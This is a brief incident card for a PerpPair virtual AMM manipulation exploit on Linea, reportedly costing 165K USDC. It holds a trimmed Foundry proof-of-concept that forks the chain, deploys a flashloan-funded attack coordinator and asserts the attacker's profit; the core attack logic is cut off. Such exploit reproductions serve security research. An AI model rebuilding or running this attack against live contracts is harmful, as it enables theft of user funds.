# [?] PerpPair - Virtual AMM Manipulation

## Summary
Severity: Unknown
Chain: Linea
Component: PerpPair
Published: 2026-04-05
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/PerpPair_exp.sol
Type: defi-exploit-poc

## Details
Lost: 165K USDC

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 30_067_820;
        vm.createSelectFork("linea", forkBlock);
        vm.roll(30_067_821);
        vm.warp(1_775_380_033);
        fundingToken = LINEA_USDC;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(AAVE_POOL, "Aave V3 Pool");
        vm.label(LINEA_USDC, "USDC");
        vm.label(COLLATERAL_VAULT, "Perp collateral vault");
        vm.label(PERP_PAIR, "PerpPair");
    }

    function testExploit() public balanceLog {
        uint256 attackerBefore = IERC20(LINEA_USDC).balanceOf(ATTACKER);
        PerpPairAttackCoordinator coordinator = new PerpPairAttackCoordinator(ATTACKER);

        vm.prank(ATTACKER);
        coordinator.run();

        uint256 profit = IERC20(LINEA_USDC).balanceOf(ATTACKER) - attackerBefore;
        emit log_named_decimal_uint("Attacker USDC profit", profit, 6);
        assertGt(profit, 165_000e6, "rebuilt PerpPair exploit profit below expected range");
    }
}

contract PerpPairAttackCoordinator {
    IERC20 private constant usdc = IERC20(LINEA_USDC);
    IAaveFlashloan private constant aave = IAaveFlashloan(AAVE_POOL);

    address private immutable profitReceiver;

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/PerpPair_exp.sol_
